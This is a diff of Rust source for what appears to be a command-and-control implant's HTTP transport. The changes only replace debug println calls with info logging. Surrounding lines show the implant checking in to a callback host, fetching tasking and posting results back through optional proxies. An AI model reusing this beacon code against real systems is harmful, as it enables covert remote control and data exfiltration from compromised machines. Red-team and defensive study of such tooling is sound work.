@@ -99,14 +99,14 @@ impl C2Transport for HttpProfile {
     fn checkin(&self, packed: &str) -> Result<String> {
         let url = self.build_get_url(packed);
         if DEBUG.load(Ordering::Relaxed) {
-            println!("[C2] checkin GET {}", &url);
+            info!("[C2] checkin GET {}", &url);
         }
         let resp = http_request(&url, "GET", Some(&self.headers), self.proxy_url().as_deref(), None).map_err(|e| {
             eprintln!("[C2] checkin error: {e}");
             e
         })?;
         if DEBUG.load(Ordering::Relaxed) {
-            println!("[C2] checkin resp: {resp}");
+            info!("[C2] checkin resp: {resp}");
         }
         Ok(resp)
     }
@@ -114,7 +114,7 @@ impl C2Transport for HttpProfile {
     fn get_tasking(&self, packed: &str) -> Result<String> {
         let url = self.build_get_url(packed);
         if DEBUG.load(Ordering::Relaxed) {
-            println!("[C2] get_tasking GET {}", &url);
+            info!("[C2] get_tasking GET {}", &url);
         }
         http_request(&url, "GET", Some(&self.headers), self.proxy_url().as_deref(), None)
     }
@@ -125,7 +125,7 @@ impl C2Transport for HttpProfile {
             self.callback_host, self.callback_port, self.post_uri
         );
         if DEBUG.load(Ordering::Relaxed) {
-            println!("[C2] post_response POST {}", &url);
+            info!("[C2] post_response POST {}", &url);
         }
         http_request(&url, "POST", Some(&self.headers), self.proxy_url().as_deref(), Some(packed))
     }
